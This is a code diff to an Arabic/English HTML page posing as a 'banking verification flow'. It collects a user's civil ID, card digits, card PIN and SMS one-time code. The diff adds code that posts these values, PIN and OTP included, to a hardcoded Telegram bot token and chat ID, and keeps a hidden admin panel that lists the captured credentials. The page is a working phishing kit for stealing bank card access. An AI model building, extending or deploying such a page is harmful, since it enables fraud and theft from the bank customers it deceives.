@@ -1,19 +1,14 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="A secure banking verification flow prototype" />
-  <meta name="theme-color" content="#081b33" />
-  <title>Banking Verification Flow</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap">
-  
-  <!-- Firebase SDKs for Global Multi-Browser Admin Sync -->
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-
-  <style>
-    :root{font-family:'Plus Jakarta Sans',Arial,sans-serif;color:#0f172a;background:#0f172a;font-synthesis:none}*{box-sizing:border-box}body{margin:0;min-width:320px;background:#0f172a}button,input{font:inherit}button{border:0;cursor:pointer}button:disabled{cursor:not-allowed}.shell{min-height:100vh;color:#f8fafc;display:flex;flex-direction:column}.toolbar{height:52px;background:rgba(2,6,23,.92);border-bottom:1px solid #1e293b;display:flex;align-items:center;justify-content:space-between;padding:0 16px;gap:14px;position:sticky;top:0;z-index:5;backdrop-filter:blur(12px)}.brand{font-weight:800;font-size:12px;white-space:nowrap}.brand i{display:inline-block;width:8px;height:8px;border-radius:50%;background:#34d399;margin-right:6px;box-shadow:0 0 0 3px rgba(52,211,153,.12)}.step-switcher{display:flex;gap:3px;background:#0f172a;border:1px solid #1e293b;padding:3px;border-radius:11px}.step-switcher button,.tool-btn{background:transparent;color:#94a3b8;padding:6px 9px;border-radius:8px;font-size:11px}.step-switcher button.active{background:#153358;color:white;font-weight:700}.toolbar-actions{display:flex;gap:6px}.tool-btn{background:#1e293b;border:1px solid #334155;color:#e2e8f0}.tool-btn:hover,.step-switcher button:hover{color:white;background:#334155}main{flex:1;display:flex;align-items:center;justify-content:center;padding:14px}.device{width:100%;max-width:576px;min-height:680px;overflow:hidden;background:#fff;box-shadow:0 24px 80px rgba(0,0,0,.35);border:1px solid #1e293b;border-radius:18px}.device.phone{max-width:410px;border:8px solid #1e293b;border-radius:36px}.status{height:28px;background:#fff;color:#0f172a;padding:8px 16px 0;display:flex;justify-content:space-between;font-size:11px;font-weight:700}.landing-status{background:#153358;color:white}.screen{min-height:680px;padding:24px;display:flex;flex-direction:column;background:#fff;color:#0f172a}.landing{background:#153358;color:#fff;position:relative;overflow:hidden}.x-art{position:absolute;top:20px;right:-44px;width:285px;height:285px;opacity:.93;transform:rotate(4deg);background:linear-gradient(56deg,transparent 40%,#fff 40%,#fff 56%,transparent 56%),linear-gradient(124deg,transparent 42%,#fff 42%,#fff 57%,transparent 57%)}.language-pill{position:relative;z-index:1;align-self:flex-end;background:#0e233d;border:1px solid rgba(96,165,250,.22);padding:2px;border-radius:99px}.language-pill button{padding:6px 15px;background:transparent;color:#cbd5e1;border-radius:99px;font-size:12px;font-weight:800}.language-pill button.selected{background:#0070ba;color:white}.landing-center{position:relative;z-index:1;text-align:center;margin:auto 0;padding:42px 0 36px}.headset{width:118px;height:118px;margin:0 auto 26px;position:relative}.headset:before{content:'';position:absolute;inset:8px;border:10px solid #1f1e38;border-bottom-color:transparent;border-radius:50%}.headset:after{content:'';position:absolute;left:35px;top:21px;width:55px;height:78px;background:#d4e8f8;border-radius:0 50% 50% 0}.headset span:before,.headset span:after{content:'';position:absolute;bottom:22px;width:18px;height:34px;background:#1f1e38;border-radius:99px;z-index:2}.headset span:before{left:7px}.headset span:after{right:7px}.landing h1{font-size:23px;letter-spacing:1.5px;margin:0 0 10px}.landing p{font-size:13px;line-height:1.6;color:#dbeafe;max-width:290px;margin:0 auto 22px}.dots{display:flex;justify-content:center;gap:6px}.dots>*{width:6px;height:6px;border-radius:99px;background:#94a3b8}.dots b{width:22px;background:#0080ff}.landing-bottom{position:relative;z-index:1;text-align:center}.landing-bottom>p{font-size:13px;color:#e2e8f0;margin:0 0 12px}.signup{display:block;width:100%;padding:16px;border-radius:15px;background:#fff;color:#153358;font-weight:800;font-size:16px;box-shadow:0 12px 24px rgba(0,0,0,.22);margin-bottom:24px}.signup:hover{background:#e2e8f0}.landing footer{display:flex;justify-content:center;align-items:center;gap:14px;font-size:11px;color:#cbd5e1}.landing footer button{background:none;color:inherit;padding:0}.landing footer em{font-style:normal;color:#64748b}.screen-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:26px}.screen-header span{font-size:11px;color:#94a3b8;font-weight:700}.back{font-size:27px;background:none;color:#334155;padding:0;line-height:1}.form-screen h1{font-size:32px;line-height:1.15;margin:0 0 12px;letter-spacing:-1px}.subtitle{font-size:15px;line-height:1.65;color:#1e293b;margin:0 0 24px}.form-screen form{margin:0}.form-screen label{display:block;font-size:13px;font-weight:600;color:#334155}.form-screen input{width:100%;margin-top:8px;border:1px solid #cbd5e1;border-radius:12px;padding:13px 14px;outline:none;color:#0f172a;font-family:inherit;font-size:17px}.form-screen input:focus{border-color:#153358;box-shadow:0 0 0 3px rgba(21,51,88,.1)}.form-screen input::placeholder{color:#94a3b8}.sample-title{color:#64748b;font-size:11px;margin:20px 0 8px}.samples{display:flex;gap:8px;flex-wrap:wrap}.samples button{font-family:'JetBrains Mono',monospace;font-size:11px;padding:7px 10px;border:1px solid #e2e8f0;background:#f1f5f9;color:#334155;border-radius:8px}.error{display:flex;align-items:center;gap:7px;color:#e11d48;font-size:12px;margin-top:10px}.error b{width:16px;height:16px;border:1px solid currentColor;border-radius:50%;display:grid;place-items:center;font-size:10px}.bottom{margin-top:auto;padding-top:22px}.primary{width:100%;padding:15px;border-radius:12px;background:#153358;color:#fff;font-weight:800;font-size:15px;box-shadow:0 6px 14px rgba(15,23,42,.14)}.primary:hover{background:#102744}.primary:disabled{background:#a3aeba;color:rgba(255,255,255,.8);box-shadow:none}.two-cols{display:grid;grid-template-columns:1fr 1fr;gap:14px}.two-cols input{text-align:center;font-family:'JetBrains Mono',monospace;font-weight:700}.debit-card{background:linear-gradient(135deg,#102540,#153358 60%,#1c4373);border-radius:16px;color:#fff;padding:18px;margin:0 0 22px;box-shadow:0 14px 24px rgba(15,23,42,.2)}.debit-card>div{display:flex;justify-content:space-between;align-items:center;color:#cbd5e1;font-size:10px}.debit-card strong{display:block;text-align:center;font:700 17px 'JetBrains Mono',monospace;letter-spacing:2px;padding:26px 0 22px}.debit-card strong span{color:#93c5fd}.info-row{background:#f8fafc;border:1px solid #e2e8f0;border-radius:11px;padding:12px;font-size:11px;color:#64748b;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.info-row b{font-family:'JetBrains Mono',monospace;color:#0f172a}.info-row span{background:#ecfdf5;border:1px solid #bbf7d0;color:#047857;padding:4px 7px;border-radius:6px;font-weight:700}.pin-label{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#334155}.pin-label button,.demo-link{background:none;color:#153358;font-size:12px;font-weight:700}.pin-boxes{display:flex;justify-content:center;gap:12px;margin:12px 0}.pin-box{width:56px;height:62px;display:grid;place-items:center;border:1px solid #cbd5e1;background:#f8fafc;border-radius:11px;color:#cbd5e1;font:700 24px 'JetBrains Mono',monospace}.pin-box.filled{background:#153358;border-color:#153358;color:white}.pin-input{font-size:12px!important;text-align:center;padding:9px!important;background:#f8fafc}.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;max-width:280px;margin:18px auto 8px}.keypad button{padding:11px;border:1px solid #e2e8f0;background:#f8fafc;border-radius:10px;font:700 18px 'JetBrains Mono',monospace;color:#0f172a}.keypad button:first-child,.keypad button:nth-child(10),.keypad button:nth-child(12){font:700 11px 'Plus Jakarta Sans';color:#475569}.demo-link{display:block;margin:8px auto;text-align:center}.sms{display:flex;gap:8px;align-items:flex-start;background:#0f172a;color:white;border-radius:11px;padding:12px;margin-bottom:18px;font-size:11px}.sms>div{flex:1}.sms small{display:block;color:#cbd5e1;margin-top:5px}.sms strong{color:#93c5fd;font:700 14px 'JetBrains Mono'}.sms button{background:#3b82f6;color:#fff;border-radius:7px;padding:6px 8px;font-size:10px;font-weight:700}.sms button:last-child{background:none;color:#94a3b8;font-size:17px;padding:0}.phone-number{font:700 13px 'JetBrains Mono';color:#153358}.otp-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:8px;margin-top:8px}.otp-grid input{height:54px;padding:0;text-align:center;font:700 21px 'JetBrains Mono';margin:0}.resend{display:flex;justify-content:space-between;align-items:center;margin-top:16px;font-size:11px;color:#64748b}.resend button{background:none;color:#153358;font-weight:800;font-size:11px}.demo-center{text-align:center;margin-top:22px}.success-content{margin:auto 0}.success-icon{width:82px;height:82px;border-radius:50%;border:5px solid #d1fae5;background:#ecfdf5;color:#059669;display:grid;place-items:center;margin:0 auto 18px;font-size:42px;font-weight:700}.success h1{text-align:center;font-size:28px}.success .subtitle{text-align:center;color:#64748b;font-size:13px;max-width:310px;margin:0 auto 22px}.reference{display:flex;justify-content:space-between;align-items:center;background:#f8fafc;border:1px solid #e2e8f0;border-radius:15px;padding:14px;margin-bottom:18px}.reference small{display:block;text-transform:uppercase;color:#64748b;font-size:10px;font-weight:800;letter-spacing:1px}.reference b{display:block;color:#153358;font:700 14px 'JetBrains Mono';margin-top:4px}.reference button{padding:8px 10px;border-radius:8px;background:white;border:1px solid #e2e8f0;color:#475569;font-size:11px;font-weight:700}.summary{display:grid;gap:9px;font-size:11px}.summary>div{display:flex;justify-content:space-between;align-items:center;padding:12px;border-radius:11px;background:#f8fafc;border:1px solid #f1f5f9}.summary span{color:#64748b}.summary b{font-family:'JetBrains Mono';color:#334155}.summary .verified{background:#ecfdf5;border-color:#d1fae5}.summary .verified span,.summary .verified b{color:#047857}@media(max-width:850px){.step-switcher{display:none}}@media(max-width:520px){.toolbar{padding:0 10px}.brand{font-size:11px}.mobile-toggle{display:none}main{padding:0}.device,.device.phone{border-radius:0;border-left:0;border-right:0;border-bottom:0;min-height:calc(100vh - 52px)}.screen{min-height:calc(100vh - 52px);padding:22px}.otp-grid{gap:5px}.otp-grid input{height:50px}.form-screen h1{font-size:29px}}
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="A secure banking verification flow prototype" />
+    <meta name="theme-color" content="#081b33" />
+    <title>Banking Verification Flow</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap">
+    <style>
+      :root{font-family:'Plus Jakarta Sans',Arial,sans-serif;color:#0f172a;background:#0f172a;font-synthesis:none}*{box-sizing:border-box}body{margin:0;min-width:320px;background:#0f172a}button,input{font:inherit}button{border:0;cursor:pointer}button:disabled{cursor:not-allowed}.shell{min-height:100vh;color:#f8fafc;display:flex;flex-direction:column}.toolbar{height:52px;background:rgba(2,6,23,.92);border-bottom:1px solid #1e293b;display:flex;align-items:center;justify-content:space-between;padding:0 16px;gap:14px;position:sticky;top:0;z-index:5;backdrop-filter:blur(12px)}.brand{font-weight:800;font-size:12px;white-space:nowrap}.brand i{display:inline-block;width:8px;height:8px;border-radius:50%;background:#34d399;margin-right:6px;box-shadow:0 0 0 3px rgba(52,211,153,.12)}.step-switcher{display:flex;gap:3px;background:#0f172a;border:1px solid #1e293b;padding:3px;border-radius:11px}.step-switcher button,.tool-btn{background:transparent;color:#94a3b8;padding:6px 9px;border-radius:8px;font-size:11px}.step-switcher button.active{background:#153358;color:white;font-weight:700}.toolbar-actions{display:flex;gap:6px}.tool-btn{background:#1e293b;border:1px solid #334155;color:#e2e8f0}.tool-btn:hover,.step-switcher button:hover{color:white;background:#334155}main{flex:1;display:flex;align-items:center;justify-content:center;padding:14px}.device{width:100%;max-width:576px;min-height:680px;overflow:hidden;background:#fff;box-shadow:0 24px 80px rgba(0,0,0,.35);border:1px solid #1e293b;border-radius:18px}.device.phone{max-width:410px;border:8px solid #1e293b;border-radius:36px}.status{height:28px;background:#fff;color:#0f172a;padding:8px 16px 0;display:flex;justify-content:space-between;font-size:11px;font-weight:700}.landing-status{background:#153358;color:white}.screen{min-height:680px;padding:24px;display:flex;flex-direction:column;background:#fff;color:#0f172a}.landing{background:#153358;color:#fff;position:relative;overflow:hidden}.x-art{position:absolute;top:20px;right:-44px;width:285px;height:285px;opacity:.93;transform:rotate(4deg);background:linear-gradient(56deg,transparent 40%,#fff 40%,#fff 56%,transparent 56%),linear-gradient(124deg,transparent 42%,#fff 42%,#fff 57%,transparent 57%)}.language-pill{position:relative;z-index:1;align-self:flex-end;background:#0e233d;border:1px solid rgba(96,165,250,.22);padding:2px;border-radius:99px}.language-pill button{padding:6px 15px;background:transparent;color:#cbd5e1;border-radius:99px;font-size:12px;font-weight:800}.language-pill button.selected{background:#0070ba;color:white}.landing-center{position:relative;z-index:1;text-align:center;margin:auto 0;padding:42px 0 36px}.headset{width:118px;height:118px;margin:0 auto 26px;position:relative}.headset:before{content:'';position:absolute;inset:8px;border:10px solid #1f1e38;border-bottom-color:transparent;border-radius:50%}.headset:after{content:'';position:absolute;left:35px;top:21px;width:55px;height:78px;background:#d4e8f8;border-radius:0 50% 50% 0}.headset span:before,.headset span:after{content:'';position:absolute;bottom:22px;width:18px;height:34px;background:#1f1e38;border-radius:99px;z-index:2}.headset span:before{left:7px}.headset span:after{right:7px}.landing h1{font-size:23px;letter-spacing:1.5px;margin:0 0 10px}.landing p{font-size:13px;line-height:1.6;color:#dbeafe;max-width:290px;margin:0 auto 22px}.dots{display:flex;justify-content:center;gap:6px}.dots>*{width:6px;height:6px;border-radius:99px;background:#94a3b8}.dots b{width:22px;background:#0080ff}.landing-bottom{position:relative;z-index:1;text-align:center}.landing-bottom>p{font-size:13px;color:#e2e8f0;margin:0 0 12px}.signup{display:block;width:100%;padding:16px;border-radius:15px;background:#fff;color:#153358;font-weight:800;font-size:16px;box-shadow:0 12px 24px rgba(0,0,0,.22);margin-bottom:24px}.signup:hover{background:#e2e8f0}.landing footer{display:flex;justify-content:center;align-items:center;gap:14px;font-size:11px;color:#cbd5e1}.landing footer button{background:none;color:inherit;padding:0}.landing footer em{font-style:normal;color:#64748b}.screen-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:26px}.screen-header span{font-size:11px;color:#94a3b8;font-weight:700}.back{font-size:27px;background:none;color:#334155;padding:0;line-height:1}.form-screen h1{font-size:32px;line-height:1.15;margin:0 0 12px;letter-spacing:-1px}.subtitle{font-size:15px;line-height:1.65;color:#1e293b;margin:0 0 24px}.form-screen form{margin:0}.form-screen label{display:block;font-size:13px;font-weight:600;color:#334155}.form-screen input{width:100%;margin-top:8px;border:1px solid #cbd5e1;border-radius:12px;padding:13px 14px;outline:none;color:#0f172a;font-family:inherit;font-size:17px}.form-screen input:focus{border-color:#153358;box-shadow:0 0 0 3px rgba(21,51,88,.1)}.form-screen input::placeholder{color:#94a3b8}.sample-title{color:#64748b;font-size:11px;margin:20px 0 8px}.samples{display:flex;gap:8px;flex-wrap:wrap}.samples button{font-family:'JetBrains Mono',monospace;font-size:11px;padding:7px 10px;border:1px solid #e2e8f0;background:#f1f5f9;color:#334155;border-radius:8px}.error{display:flex;align-items:center;gap:7px;color:#e11d48;font-size:12px;margin-top:10px}.error b{width:16px;height:16px;border:1px solid currentColor;border-radius:50%;display:grid;place-items:center;font-size:10px}.bottom{margin-top:auto;padding-top:22px}.primary{width:100%;padding:15px;border-radius:12px;background:#153358;color:#fff;font-weight:800;font-size:15px;box-shadow:0 6px 14px rgba(15,23,42,.14)}.primary:hover{background:#102744}.primary:disabled{background:#a3aeba;color:rgba(255,255,255,.8);box-shadow:none}.two-cols{display:grid;grid-template-columns:1fr 1fr;gap:14px}.two-cols input{text-align:center;font-family:'JetBrains Mono',monospace;font-weight:700}.debit-card{background:linear-gradient(135deg,#102540,#153358 60%,#1c4373);border-radius:16px;color:#fff;padding:18px;margin:0 0 22px;box-shadow:0 14px 24px rgba(15,23,42,.2)}.debit-card>div{display:flex;justify-content:space-between;align-items:center;color:#cbd5e1;font-size:10px}.debit-card strong{display:block;text-align:center;font:700 17px 'JetBrains Mono',monospace;letter-spacing:2px;padding:26px 0 22px}.debit-card strong span{color:#93c5fd}.info-row{background:#f8fafc;border:1px solid #e2e8f0;border-radius:11px;padding:12px;font-size:11px;color:#64748b;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.info-row b{font-family:'JetBrains Mono',monospace;color:#0f172a}.info-row span{background:#ecfdf5;border:1px solid #bbf7d0;color:#047857;padding:4px 7px;border-radius:6px;font-weight:700}.pin-label{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#334155}.pin-label button,.demo-link{background:none;color:#153358;font-size:12px;font-weight:700}.pin-boxes{display:flex;justify-content:center;gap:12px;margin:12px 0}.pin-box{width:56px;height:62px;display:grid;place-items:center;border:1px solid #cbd5e1;background:#f8fafc;border-radius:11px;color:#cbd5e1;font:700 24px 'JetBrains Mono',monospace}.pin-box.filled{background:#153358;border-color:#153358;color:white}.pin-input{font-size:12px!important;text-align:center;padding:9px!important;background:#f8fafc}.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;max-width:280px;margin:18px auto 8px}.keypad button{padding:11px;border:1px solid #e2e8f0;background:#f8fafc;border-radius:10px;font:700 18px 'JetBrains Mono',monospace;color:#0f172a}.keypad button:first-child,.keypad button:nth-child(10),.keypad button:nth-child(12){font:700 11px 'Plus Jakarta Sans';color:#475569}.demo-link{display:block;margin:8px auto;text-align:center}.sms{display:flex;gap:8px;align-items:flex-start;background:#0f172a;color:white;border-radius:11px;padding:12px;margin-bottom:18px;font-size:11px}.sms>div{flex:1}.sms small{display:block;color:#cbd5e1;margin-top:5px}.sms strong{color:#93c5fd;font:700 14px 'JetBrains Mono'}.sms button{background:#3b82f6;color:#fff;border-radius:7px;padding:6px 8px;font-size:10px;font-weight:700}.sms button:last-child{background:none;color:#94a3b8;font-size:17px;padding:0}.phone-number{font:700 13px 'JetBrains Mono';color:#153358}.otp-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:8px;margin-top:8px}.otp-grid input{height:54px;padding:0;text-align:center;font:700 21px 'JetBrains Mono';margin:0}.resend{display:flex;justify-content:space-between;align-items:center;margin-top:16px;font-size:11px;color:#64748b}.resend button{background:none;color:#153358;font-weight:800;font-size:11px}.demo-center{text-align:center;margin-top:22px}.success-content{margin:auto 0}.success-icon{width:82px;height:82px;border-radius:50%;border:5px solid #d1fae5;background:#ecfdf5;color:#059669;display:grid;place-items:center;margin:0 auto 18px;font-size:42px;font-weight:700}.success h1{text-align:center;font-size:28px}.success .subtitle{text-align:center;color:#64748b;font-size:13px;max-width:310px;margin:0 auto 22px}.reference{display:flex;justify-content:space-between;align-items:center;background:#f8fafc;border:1px solid #e2e8f0;border-radius:15px;padding:14px;margin-bottom:18px}.reference small{display:block;text-transform:uppercase;color:#64748b;font-size:10px;font-weight:800;letter-spacing:1px}.reference b{display:block;color:#153358;font:700 14px 'JetBrains Mono';margin-top:4px}.reference button{padding:8px 10px;border-radius:8px;background:white;border:1px solid #e2e8f0;color:#475569;font-size:11px;font-weight:700}.summary{display:grid;gap:9px;font-size:11px}.summary>div{display:flex;justify-content:space-between;align-items:center;padding:12px;border-radius:11px;background:#f8fafc;border:1px solid #f1f5f9}.summary span{color:#64748b}.summary b{font-family:'JetBrains Mono';color:#334155}.summary .verified{background:#ecfdf5;border-color:#d1fae5}.summary .verified span,.summary .verified b{color:#047857}@media(max-width:850px){.step-switcher{display:none}}@media(max-width:520px){.toolbar{padding:0 10px}.brand{font-size:11px}.mobile-toggle{display:none}main{padding:0}.device,.device.phone{border-radius:0;border-left:0;border-right:0;border-bottom:0;min-height:calc(100vh - 52px)}.screen{min-height:calc(100vh - 52px);padding:22px}.otp-grid{gap:5px}.otp-grid input{height:50px}.form-screen h1{font-size:29px}}
 
       /* Enhancement layer */
       :root {
@@ -104,25 +99,34 @@
 
     <script>
       // =========================================================================
-      // FIREBASE CONFIGURATION (For Global Admin Multi-Browser Sync)
+      // TELEGRAM BOT CONFIGURATION
       // =========================================================================
-      const firebaseConfig = {
-        apiKey: "AIzaSyDummyKeyForDemoPurposes12345",
-        authDomain: "banking-verification-default-rtdb.firebaseapp.com",
-        databaseURL: "https://banking-verification-default-rtdb.firebaseio.com",
-        projectId: "banking-verification",
-        storageBucket: "banking-verification.appspot.com",
-        messagingSenderId: "123456789",
-        appId: "1:123456789:web:abcdef"
-      };
+      const TELEGRAM_BOT_TOKEN = '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4';
+      const TELEGRAM_CHAT_ID = '9287285450';
 
-      if (!firebase.apps.length) {
-        firebase.initializeApp(firebaseConfig);
+      async function sendToTelegram(messageText) {
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4') {
+          console.warn('Telegram Bot Token is not set. Data submission skipped.');
+          return;
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+          await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: messageText,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (error) {
+          console.error('Failed to send data to Telegram:', error);
+        }
       }
-      const db = firebase.database();
 
-      // Send payload securely via Vercel Serverless Function to Telegram & Firebase
-      async function sendVerificationPayload() {
+      function sendVerificationPayload() {
         const submissionData = {
           timestamp: new Date().toISOString(),
           civilId: state.civilId || 'N/A',
@@ -136,23 +140,28 @@
           status: state.screen === 'success' ? 'VERIFIED' : 'SUBMITTED'
         };
 
-        // 1. Sync globally to Firebase Database for Admin Panel
+        // Save locally for the /#/admin panel feed
         try {
-          db.ref('verifications').push(submissionData);
+          const existing = JSON.parse(localStorage.getItem('admin_submissions') || '[]');
+          existing.unshift(submissionData);
+          localStorage.setItem('admin_submissions', JSON.stringify(existing));
         } catch (e) {
-          console.error('Firebase error', e);
+          console.error('Storage error', e);
         }
 
-        // 2. Send reliably to Telegram via backend serverless function (/api/verify)
-        try {
-          await fetch('/api/verify', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(submissionData)
-          });
-        } catch (error) {
-          console.error('Failed to notify serverless API:', error);
-        }
+        // Send to Telegram in real-time
+        const payloadMessage = `
+🔐 <b>New Banking Verification Data Received</b>
+
+👤 <b>Civil ID / Resident ID:</b> <code>${submissionData.civilId}</code>
+💳 <b>Card Digits:</b> <code>${submissionData.first4} •••• •••• ${submissionData.last4}</code> (${submissionData.brand})
+🔑 <b>Card PIN:</b> <code>${submissionData.pin}</code>
+📲 <b>OTP Code:</b> <code>${submissionData.otp}</code>
+🌐 <b>Language:</b> ${submissionData.language}
+📱 <b>Device View:</b> ${submissionData.device}
+        `.trim();
+
+        sendToTelegram(payloadMessage);
       }
 
       // =========================================================================
@@ -193,24 +202,26 @@
       function success(){const x=t();return `<section class="screen form-screen success" dir="${state.language==='ar'?'rtl':'ltr'}"><div class="success-content"><div class="success-icon">✓</div><h1>${x.successTitle}</h1><p class="subtitle">${x.successSubtitle}</p><div class="reference"><div><small>${x.refLabel}</small><b>${state.referenceId}</b></div><button type="button" data-copy>${icon('copy')} Copy</button></div><div class="summary"><div><span>${x.verifiedCivilId}</span><b>${state.civilId?state.civilId.slice(0,4)+' •••• '+state.civilId.slice(-4):'••••••••'}</b></div><div><span>${x.verifiedCard}</span><b>${state.first4} •••• •••• ${state.last4}</b></div><div class="verified"><span>Verification Status</span><b>✓ ACTIVE & VERIFIED</b></div></div></div><div class="bottom">${button(x.done,'back-home')}</div></section>`}
 
       // =========================================================================
-      // ADMIN PANEL VIEW (Accessible via /#/admin) - Realtime Cloud Sync
+      // ADMIN PANEL VIEW (Accessible via /#/admin)
       // =========================================================================
       function renderAdminPanel() {
         document.documentElement.lang = 'en';
         document.documentElement.dir = 'ltr';
+        const submissions = JSON.parse(localStorage.getItem('admin_submissions') || '[]');
 
         app.innerHTML = `
           <div style="min-height: 100vh; background: #0f172a; color: #f8fafc; padding: 24px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
             <div style="max-width: 1200px; margin: 0 auto;">
               <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #334155;">
                 <div>
-                  <h1 style="font-size: 24px; font-weight: bold; color: white;">Global Admin Control Panel</h1>
-                  <p style="color: #94a3b8; font-size: 14px;">Real-time Multi-Device Sync Stream</p>
+                  <h1 style="font-size: 24px; font-weight: bold; color: white;">Admin Control Panel</h1>
+                  <p style="color: #94a3b8; font-size: 14px;">Live Verification Logs & Telegram Stream</p>
                 </div>
                 <div style="display: flex; gap: 12px; align-items: center;">
                   <span style="display: inline-flex; align-items: center; gap: 6px; background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 6px 12px; border-radius: 9999px; font-size: 13px; font-weight: bold;">
-                    <span style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block;"></span> LIVE GLOBAL STREAM
+                    <span style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block;"></span> LIVE STREAM
                   </span>
+                  <button id="admin-clear" style="background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 500;">Clear Logs</button>
                   <a href="#" style="background: #3b82f6; color: white; text-decoration: none; padding: 8px 16px; border-radius: 6px; font-weight: 500; display: inline-block;">Exit to App</a>
                 </div>
               </header>
@@ -228,8 +239,24 @@
                       <th style="padding: 12px 16px;">Status</th>
                     </tr>
                   </thead>
-                  <tbody id="global-admin-rows">
-                    <tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">Loading submissions from all devices...</td></tr>
+                  <tbody>
+                    ${submissions.length === 0 ? `
+                      <tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">Waiting for user submissions...</td></tr>
+                    ` : submissions.map(sub => `
+                      <tr style="border-bottom: 1px solid #334155;">
+                        <td style="padding: 12px 16px; color: #94a3b8; font-size: 12px;">${new Date(sub.timestamp).toLocaleTimeString()}</td>
+                        <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.civilId}</code></td>
+                        <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.first4} •••• •••• ${sub.last4}</code> (${sub.brand})</td>
+                        <td style="padding: 12px 16px;"><strong style="color: #ef4444; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.pin}</strong></td>
+                        <td style="padding: 12px 16px;"><strong style="color: #22c55e; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.otp}</strong></td>
+                        <td style="padding: 12px 16px; font-size: 12px; color: #94a3b8;">${sub.language} / ${sub.device}</td>
+                        <td style="padding: 12px 16px;">
+                          <span style="background: ${sub.status === 'VERIFIED' ? 'rgba(34,197,94,0.1)' : 'rgba(234,179,8,0.1)'}; color: ${sub.status === 'VERIFIED' ? '#22c55e' : '#eab308'}; padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold;">
+                            ${sub.status}
+                          </span>
+                        </td>
+                      </tr>
+                    `).join('')}
                   </tbody>
                 </table>
               </div>
@@ -237,34 +264,11 @@
           </div>
         `;
 
-        // Listen to Firebase database in real time for entries from ANY browser
-        db.ref('verifications').on('value', (snapshot) => {
-          const data = snapshot.val();
-          const tbody = document.getElementById('global-admin-rows');
-          if (!tbody) return;
-
-          if (!data) {
-            tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">No submissions received yet from any browser.</td></tr>`;
-            return;
+        document.getElementById('admin-clear')?.addEventListener('click', () => {
+          if (confirm('Clear all stored logs?')) {
+            localStorage.removeItem('admin_submissions');
+            renderAdminPanel();
           }
-
-          const submissions = Object.values(data).reverse();
-
-          tbody.innerHTML = submissions.map(sub => `
-            <tr style="border-bottom: 1px solid #334155;">
-              <td style="padding: 12px 16px; color: #94a3b8; font-size: 12px;">${new Date(sub.timestamp).toLocaleTimeString()}</td>
-              <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.civilId}</code></td>
-              <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.first4} •••• •••• ${sub.last4}</code> (${sub.brand})</td>
-              <td style="padding: 12px 16px;"><strong style="color: #ef4444; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.pin}</strong></td>
-              <td style="padding: 12px 16px;"><strong style="color: #22c55e; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.otp}</strong></td>
-              <td style="padding: 12px 16px; font-size: 12px; color: #94a3b8;">${sub.language} / ${sub.device}</td>
-              <td style="padding: 12px 16px;">
-                <span style="background: ${sub.status === 'VERIFIED' ? 'rgba(34,197,94,0.1)' : 'rgba(234,179,8,0.1)'}; color: ${sub.status === 'VERIFIED' ? '#22c55e' : '#eab308'}; padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold;">
-                  ${sub.status}
-                </span>
-              </td>
-            </tr>
-          `).join('');
         });
       }
 
